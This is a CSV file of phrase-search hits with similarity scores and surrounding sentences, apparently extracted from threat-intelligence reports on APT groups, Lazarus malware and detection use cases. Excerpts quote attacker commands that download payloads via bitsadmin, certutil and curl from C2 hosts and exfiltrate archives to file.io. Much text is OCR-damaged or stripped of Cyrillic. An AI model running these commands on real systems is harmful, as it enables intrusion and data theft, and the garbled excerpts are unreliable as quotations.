hash,phrase,similarity,adjacent_sentences
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /c,0.8937965527573956,"['We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /c,0.82672272449881,"['Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'.""]"
4cfa49159667f23c95faae1778231c91,cmd.exe /c,0.845503132152836,"['Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.8135172745614935,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.7962584600454754,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe /c,0.7597704693771454,"['The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c,1.0,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
31347d89b18461f35448b26fefb00133,cmd /c,0.8135172745614935,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
d5019121cbc645eb0787efab173a12b3,cmd /c,1.0,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /c,0.8135172745614935,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
3d2e99ba94188b71a17364073a49e3ea,batch file,0.7657437517555142,"['The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.']"
7c835116563bd415741d640fd6a04033,the scriptlet of the batch file,0.8331851796540548,"['WScript.exe ""%system32%\\SyncApvPublishingServer.vbs"" ""n;cmd.exe \'/c curl 1perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClw/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\regsile.bat & start /b %public%\\regsile.bat\' We also observed the context around that batch file in our telemetry.', 'The batch file name is What is Blockchain.bat.', 'As the file name sugests, this group stil targets the blockchain industry.', 'We acquired the scriptlet of the batch file.', '1xcopy /h /y /q How-To-Extension.pdf c:\\users\\public\\Inproc.exe* 2start xcopy /h /y /q Blockchain-old.pdf c:\\users\\public\\rwinsta.exe* 3start c:\\users\\public\\Inproc.exe ""%cd%\\Blockchain.pdf"" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c0fa5c9bef2), and the rwinsta.exe is a legitimate rundl32.exe file (MD5 ef3179d498793bf4234f708d3be2863).', 'The Blockchain.pdf file is a malicious HTML aplication file spawned by the mshta.exe proces.', 'Unfortunately, we dont have the HTA script (Blockchain.pdf), but we can asume the functionality of the script based on our telemetry showing the decoy document and fetching the next stage payload.']"
920bbf3f4cf30cf9c556531074485448,"cmd.exe"" /c",0.8176210416244082,"['29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .']"
31347d89b18461f35448b26fefb00133,"cmd.exe"" /c",1.0,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
399c17d5f44d8b855c9751aae73f3c11,"cmd.exe"" /c",0.8937965527573956,"['We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.']"
